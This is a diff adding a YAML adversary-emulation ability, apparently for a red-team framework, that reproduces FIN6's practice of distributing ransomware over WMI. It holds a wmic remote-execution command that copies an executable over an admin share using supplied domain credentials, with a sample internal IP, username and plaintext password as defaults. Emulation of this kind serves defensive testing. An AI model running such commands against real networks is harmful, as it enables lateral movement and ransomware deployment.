@@ -1,0 +1,32 @@
+- id: 5599b7cf-6e8d-43c1-a311-e953dd0fbd2a
+  name: Distribute Ransomware via WMI
+  description: FIN6 utilizes WMI to distribute ransomware to intended targets
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_distribute
+  procedure_step: 7.2.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 172.18.39.6
+    domain_user:
+      description: Domain and username
+      type: string
+      default: ctid\pgustavo
+    password:
+      description: Valid Password
+      type: string
+      default: 'W1n1!2019'
+  executors:
+  - name: command_prompt
+    elevation_required: true
+    command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
